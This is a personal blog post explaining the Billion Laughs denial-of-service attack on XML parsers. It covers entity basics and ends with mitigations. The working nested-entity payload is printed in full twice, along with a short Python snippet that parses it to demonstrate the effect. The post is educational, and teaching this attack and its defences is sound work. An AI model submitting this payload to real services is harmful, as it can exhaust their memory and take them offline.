<!DOCTYPE html>
<!--
    So Simple Jekyll Theme 3.1.0
    Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
    Free for personal and commercial use under the MIT license
    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
-->
<html lang="en-US" class="no-js">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  

  
    <title>XML Security: A Billion Laughs</title>
    <meta name="description" content="What ? The Billion Laughs attack is a denial-of-service attack that targets XML parsers in many programming language libraries such as: SAX, Etree, DOM. It c...">
    <link rel="canonical" href="http://localhost:4000/XML-Security/">
  

  <script>
    /* Cut the mustard */
    if ( 'querySelector' in document && 'addEventListener' in window ) {
      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
    }
  </script>

  <link rel="stylesheet" href="/assets/css/main.css">
  
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i|Lora:400,400i,700,700i|Playfair+Display:400,400i,700,700i">
  <link rel="alternate" type="application/atom+xml" title="Kha Nguyen" href="/feed.xml">
<!-- start custom head snippets -->

<!-- insert favicons. use http://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

</head>


  <body class="layout--post  xml-security-a-billion-laughs">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    
  <div class="navigation-wrapper">
    <a href="#menu-toggle" id="menu-toggle">Menu</a>
    <nav id="primary-nav" class="site-nav animated drop">
      <ul><li><a href="/">Home</a></li><li><a href="/posts/">Posts</a></li><li><a href="/research/">Research</a></li><li><a href="/projects/">Projects</a></li><li><a href="/search/">Search</a></li></ul>
    </nav>
  </div><!-- /.navigation-wrapper -->


    

    <main id="main" class="main-content" aria-label="Content">
  <article class="h-entry">
    

    <div class="page-wrapper">
      <header class="page-header">
        
        
          <h1 id="page-title" class="page-title p-name">XML Security: A Billion Laughs
</h1>
        
      </header>

      <div class="page-sidebar">
        <div class="page-author h-card p-author"><img src="/images/avatar.jpeg" class="author-avatar u-photo" alt="Kha Nguyen"><div class="author-info"><div class="author-name">
        <em>by</em> <span class="p-name">Kha Nguyen</span>
      </div>

<span class="read-time">3 min read</span>

    <time class="page-date dt-published" datetime="2016-01-26T02:22:02+09:00"><a class="u-url" href="">2016-01-26</a>
</time>

  </div>
</div>

        

        
  <h3 class="page-taxonomies-title">Tags</h3>
  <ul class="page-taxonomies"><li class="page-taxonomy">security</li>
  </ul>


      </div>

      <div class="page-content">
        <div class="e-content">
          <h1 id="what-">What ?</h1>
<p>The Billion Laughs attack is a denial-of-service attack that targets XML parsers in many programming language libraries such as: SAX, Etree, DOM.  It can occur even when using well-formed XML and can also pass XML schema validation.</p>

<h1 id="why-should-we-care-about-it-">Why should we care about it ?</h1>
<p>An attacker submits an XML document to a target application where the XML document uses nested entity expansion to produce an excessively large output XML. XML allows the definition of macro-like structures that can be used to simplify the creation of complex structures. However, this capability can be abused to create excessive demands on a processor’s CPU and memory. A small number of nested expansions can result in an exponential growth in demands on memory.</p>

<h1 id="how">How</h1>
<h3 id="background">Background</h3>
<p>In order to understand how Billion laughs attack works, we need to have background in XML entity and some definitions of XML document:</p>

<ul>
  <li>DTDs (Document Type Definition) are meant to define the expected structure of an XML document. It is a set of markup declarations that defines a document type for an SGML-family markup languages (SGML, XML, HTML).</li>
  <li>XML stands for EXtensible Markup Language.</li>
  <li>XML was designed to store and transport data.</li>
  <li>XML was designed to be both human and machine-readable.</li>
</ul>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;animal&gt;</span>
  <span class="nt">&lt;name&gt;</span>cat<span class="nt">&lt;/name&gt;</span>
  <span class="nt">&lt;action&gt;</span>meoooo<span class="nt">&lt;/action&gt;</span>
<span class="nt">&lt;/animal&gt;</span>
</code></pre></div></div>

<p>XML Entities:</p>

<ul>
  <li>Entities are used to define shortcuts to special characters.</li>
  <li>Entities can be declared internal or external.</li>
  <li>Entities that are not predefined can be declared internal or external.
    <ul>
      <li>Internally declared - the entity is defined within the same document.</li>
      <li>Externally declared - the entity is defined in an external document. Only the reference to the external document is given.</li>
    </ul>
  </li>
</ul>

<p>The following code will explain what XML entity is:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!ENTITY writer "Donald Duck."&gt;</span>
<span class="cp">&lt;!ENTITY copyright "Copyright W3Schools."&gt;</span>
<span class="nt">&lt;author&gt;</span><span class="ni">&amp;writer;&amp;copyright;</span><span class="nt">&lt;/author&gt;</span>
</code></pre></div></div>

<p>When we use <code class="highlighter-rouge">&amp;writer;</code> it will symbolic present to writer attribute and get value “Donal Duck”. Similar to that thing, <code class="highlighter-rouge">&amp;copyright;</code> will symboic present to copyright and get value “Copyright W3Schools”.</p>

<h2 id="exploit">Exploit</h2>
<p>The vanilla Billion Laughs attack is illustrated as XML code follow:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE lolz [
&lt;!ENTITY lol "lol"&gt;</span>
<span class="cp">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span>
<span class="cp">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span>
<span class="cp">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span>
<span class="cp">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span>
<span class="cp">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span>
<span class="cp">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span>
<span class="cp">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span>
<span class="cp">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span>
]&gt;
<span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/lolz&gt;</span>
</code></pre></div></div>

<p>In this example, there are 10 different XML entities, lol – lol9. The first entity, lol is defined to be the string “lol”.  However, each of the other entities are defined to be 10 of another entity.  The document content section of this XML file contains a reference to only one instance of the entity lol9.  However, when this is being parsed by a DOM or SAX parser, when lol9 is encountered, it is expanded into 10 lol8’s, each of which is expanded into 10 lol7’s, and so on and so forth.  By the time everything is expanded to the text lol, there are 100,000,000 instances of the string lol.  If there was one more entity, or lol was defined as 10 strings of “lol”, there would be a Billion “lol”s, hence the name of the attack.  Needless to say, these expansions consumes an exponential amount of resources and time, causing the DOS.</p>

<h1 id="demo">Demo</h1>
<p>XML file name <code class="highlighter-rouge">lol.xml</code>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE lolz [
&lt;!ENTITY lol "lol"&gt;</span>
<span class="cp">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span>
<span class="cp">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span>
<span class="cp">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span>
<span class="cp">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span>
<span class="cp">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span>
<span class="cp">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span>
<span class="cp">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span>
<span class="cp">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span>
]&gt;
<span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/lolz&gt;</span>
</code></pre></div></div>

<p>Python code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>
<span class="n">tree</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="s">'lol.xml'</span><span class="p">)</span>
<span class="n">root</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">getroot</span><span class="p">()</span>
</code></pre></div></div>

<p>Execute it.</p>

<h1 id="mitigating">Mitigating</h1>
<p>Because the behavior of each XML parser may be different based on implementation, there is no one way to prevent Billion Laughs attacks.  However, there are a few main techniques used to prevent this denial-of-service attack.</p>

<ul>
  <li>Turn off entity expansion.</li>
  <li>Limit the number of Entity Reference Nodes so that the parser can expand.</li>
  <li>Limit the number of characters entities can expand to.</li>
</ul>

        </div>

        

        
          

        

        <nav class="page-pagination" role="navigation">
  
    <a class="page-previous" href="/new-blog/">
      <h4 class="page-pagination-label">Previous</h4>
      <span class="page-pagination-title">
        <i class="fas fa-arrow-left"></i> new Blog()

      </span>
    </a>
  

  
    <a class="page-next" href="/Dynamic-module-import/">
      <h4 class="page-pagination-label">Next</h4>
      <span class="page-pagination-title">
        Dynamic module loading
 <i class="fas fa-arrow-right"></i>
      </span>
    </a>
  
</nav>

      </div>
    </div>
  </article>
</main>


    <footer id="footer" class="site-footer">
  <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
<div class="social-icons"><a class="social-icon" href="https://twitter.com/__ngtrongkha"><i class="fab fa-twitter-square fa-2x" title="Twitter"></i></a><a class="social-icon" href="https://github.com/lotusirous"><i class="fab fa-github-square fa-2x" title="GitHub"></i></a><a class="social-icon" href="https://github.com/lotusirous"><i class="fab fa-medium fa-2x" title="Medium"></i></a></div><div class="copyright">
    
      <p>&copy; 2018 Kha Nguyen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://github.com/mmistakes/so-simple-theme" rel="nofollow">So Simple</a>.</p>
    
  </div>
</footer>

    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.0.7/js/all.js"></script>


<!-- MathJax -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  </body>

</html>
